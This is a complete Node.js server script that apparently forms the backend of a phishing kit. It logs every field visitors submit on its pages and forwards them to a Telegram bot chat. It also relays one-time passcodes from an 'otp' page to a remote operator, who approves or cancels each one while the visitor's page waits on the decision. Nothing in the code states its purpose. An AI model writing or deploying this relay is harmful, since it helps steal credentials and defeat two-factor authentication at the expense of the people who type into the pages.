const http = require("http");
const fs = require("fs");
const path = require("path");

const ROOT = __dirname;
const HOST = "0.0.0.0";
const PORT = Number(process.env.PORT) || 3000;
const STORE = path.join(ROOT, "submissions.json");

try {
  fs.readFileSync(path.join(ROOT, ".env"), "utf8")
    .split(/\r?\n/)
    .forEach(function (line) {
      const match = line.match(/^\s*([^#=\s]+)\s*=\s*(.*?)\s*$/);
      if (match && !(match[1] in process.env)) {
        process.env[match[1]] = match[2].replace(/^["']|["']$/g, "");
      }
    });
} catch (e) {}

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";

function telegramApi(method, payload, useGet) {
  if (!BOT_TOKEN) return Promise.resolve(null);
  const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/" + method;
  const options = { method: useGet ? "GET" : "POST" };
  if (!useGet) {
    options.headers = { "Content-Type": "application/json" };
    options.body = JSON.stringify(payload || {});
  }
  return fetch(url + (useGet ? "?" + new URLSearchParams(payload || {}) : ""), options)
    .then(function (r) {
      return r.json();
    })
    .catch(function (err) {
      console.error("Telegram error:", err.message);
      return null;
    });
}

function notifyTelegram(entry) {
  if (!CHAT_ID) return;
  const lines = Object.keys(entry.data).map(function (key) {
    return key + ": " + String(entry.data[key]);
  });
  const text = "[" + entry.page + "] " + entry.time + "\n" + lines.join("\n");
  telegramApi("sendMessage", { chat_id: CHAT_ID, text: text });
}

const approvals = new Map();
let updateOffset = 0;

function sendApprovalRequest(entry) {
  const id = Math.random().toString(36).slice(2, 10);
  approvals.set(id, { status: "pending", time: Date.now() });
  const code = String(entry.data.status || "");
  const text =
    "OTP verification request\nCode: " +
    code +
    "\nTime: " +
    entry.time +
    "\nApprove or cancel:";
  return telegramApi("sendMessage", {
    chat_id: CHAT_ID,
    text: text,
    reply_markup: {
      inline_keyboard: [
        [
          { text: "Approve", callback_data: "approve:" + id },
          { text: "Cancel", callback_data: "cancel:" + id },
        ],
      ],
    },
  }).then(function (result) {
    if (!result || !result.ok || !result.result) {
      approvals.delete(id);
      throw new Error("Telegram send failed");
    }
    approvals.get(id).messageId = result.result.message_id;
    approvals.get(id).chatId = result.result.chat && result.result.chat.id;
    return id;
  });
}

function handleCallback(query) {
  const parts = String(query.data || "").split(":");
  const action = parts.shift();
  const id = parts.join(":");
  const approval = approvals.get(id);
  const answer = approval ? "Registered" : "Request expired";
  telegramApi("answerCallbackQuery", {
    callback_query_id: query.id,
    text: answer,
  });
  if (!approval || approval.status !== "pending") return;
  approval.status = action === "approve" ? "approved" : "cancelled";
  const text =
    "OTP verification " +
    (approval.status === "approved" ? "APPROVED" : "CANCELLED") +
    "\nID: " +
    id;
  if (approval.messageId) {
    telegramApi("editMessageText", {
      chat_id: approval.chatId || CHAT_ID,
      message_id: approval.messageId,
      text: text,
    });
  }
}

function pollUpdates() {
  if (!BOT_TOKEN) return;
  telegramApi(
    "getUpdates",
    { offset: updateOffset, timeout: 5 },
    true,
  ).then(function (data) {
    if (data && data.ok && Array.isArray(data.result)) {
      data.result.forEach(function (update) {
        if (update.callback_query) handleCallback(update.callback_query);
        if (update.update_id >= updateOffset) updateOffset = update.update_id + 1;
      });
    }
    const now = Date.now();
    approvals.forEach(function (value, key) {
      if (now - value.time > 10 * 60 * 1000) approvals.delete(key);
    });
    setTimeout(pollUpdates, 300);
  });
}

let submissions = [];
try {
  submissions = JSON.parse(fs.readFileSync(STORE, "utf8"));
} catch (e) {
  submissions = [];
}

const TYPES = {
  ".html": "text/html; charset=utf-8",
  ".css": "text/css; charset=utf-8",
  ".js": "text/javascript; charset=utf-8",
  ".png": "image/png",
  ".svg": "image/svg+xml",
  ".ico": "image/x-icon",
};

function send(res, status, body, type) {
  res.writeHead(status, {
    "Content-Type": type || "text/plain; charset=utf-8",
    "Cache-Control": "no-store",
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Headers": "Content-Type",
    "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
  });
  res.end(body);
}

function serveStatic(req, res, pathname) {
  let rel = decodeURIComponent(pathname);
  if (rel === "/") rel = "/index.html";
  const file = path.normalize(path.join(ROOT, rel));
  if (!file.startsWith(ROOT + path.sep)) return send(res, 403, "Forbidden");
  fs.readFile(file, (err, data) => {
    if (err) return send(res, 404, "Not found");
    send(
      res,
      200,
      data,
      TYPES[path.extname(file).toLowerCase()] || "application/octet-stream",
    );
  });
}

function viewer() {
  const rows =
    submissions
      .slice()
      .reverse()
      .map((s) => {
        const fields = Object.keys(s.data)
          .map(
            (k) =>
              "<dt>" +
              k +
              "</dt><dd>" +
              String(s.data[k]).replace(
                /[<>&]/g,
                (c) => ({ "<": "&lt;", ">": "&gt;", "&": "&amp;" })[c],
              ) +
              "</dd>",
          )
          .join("");
        return (
          "<article><h2>" +
          s.page +
          " <small>" +
          s.time +
          "</small></h2><dl>" +
          fields +
          "</dl></article>"
        );
      })
      .join("\n") || "<p>No submissions yet.</p>";
  return (
    '<!doctype html><html><head><meta charset="utf-8"><title>Local submissions</title>' +
    '<meta http-equiv="refresh" content="5">' +
    "<style>body{font:14px/1.5 system-ui,sans-serif;max-width:760px;margin:40px auto;padding:0 16px;color:#222}" +
    "article{border:1px solid #ddd;border-radius:8px;padding:12px 16px;margin:0 0 16px}h2{margin:0 0 8px;font-size:16px}" +
    "small{font-weight:400;color:#888}dl{display:grid;grid-template-columns:150px 1fr;margin:0}dt{font-weight:600}dd{margin:0;word-break:break-all}</style>" +
    '</head><body><h1>Local submissions <a href="/api/clear" style="font-size:12px;font-weight:400">clear</a></h1>' +
    rows +
    "</body></html>"
  );
}

const server = http.createServer((req, res) => {
  const url = new URL(req.url, "http://" + HOST + ":" + PORT);
  if (req.method === "OPTIONS" && url.pathname === "/api/submit")
    return send(res, 204, "");
  if (req.method === "POST" && url.pathname === "/api/submit") {
    let body = "";
    req.on("data", (chunk) => {
      body += chunk;
      if (body.length > 1e6) req.destroy();
    });
    req.on("end", () => {
      try {
        const payload = JSON.parse(body);
        const entry = {
          time: new Date().toISOString(),
          page: String(payload.page || "unknown").slice(0, 120),
          data: payload.data || {},
        };
        submissions.push(entry);
        fs.writeFileSync(STORE, JSON.stringify(submissions, null, 2));
        console.log("[" + entry.time + "] " + entry.page, entry.data);
        if (entry.page === "otp" && CHAT_ID) {
          sendApprovalRequest(entry)
            .then(function (id) {
              send(
                res,
                200,
                JSON.stringify({ ok: true, approvalId: id }),
                "application/json",
              );
            })
            .catch(function () {
              notifyTelegram(entry);
              send(res, 200, JSON.stringify({ ok: true }), "application/json");
            });
        } else {
          notifyTelegram(entry);
          send(res, 200, JSON.stringify({ ok: true }), "application/json");
        }
      } catch (e) {
        send(
          res,
          400,
          JSON.stringify({ ok: false, error: "Invalid JSON" }),
          "application/json",
        );
      }
    });
    return;
  }
  if (req.method === "GET" && url.pathname.indexOf("/api/approval/") === 0) {
    const id = url.pathname.slice("/api/approval/".length);
    const approval = approvals.get(id);
    const status = approval ? approval.status : "unknown";
    return send(res, 200, JSON.stringify({ status: status }), "application/json");
  }
  if (req.method === "GET" && url.pathname === "/api/submissions") {
    return send(res, 200, JSON.stringify(submissions), "application/json");
  }
  if (req.method === "GET" && url.pathname === "/api/clear") {
    submissions = [];
    fs.writeFileSync(STORE, "[]");
    res.writeHead(302, { Location: "/submissions" });
    return res.end();
  }
  if (req.method === "GET" && url.pathname === "/submissions") {
    return send(res, 200, viewer(), "text/html; charset=utf-8");
  }
  serveStatic(req, res, url.pathname);
});

server.listen(PORT, HOST, () => {
  pollUpdates();
  console.log("Local test server: http://" + HOST + ":" + PORT);
  console.log(
    "Submissions viewer: http://" + HOST + ":" + PORT + "/submissions",
  );
});
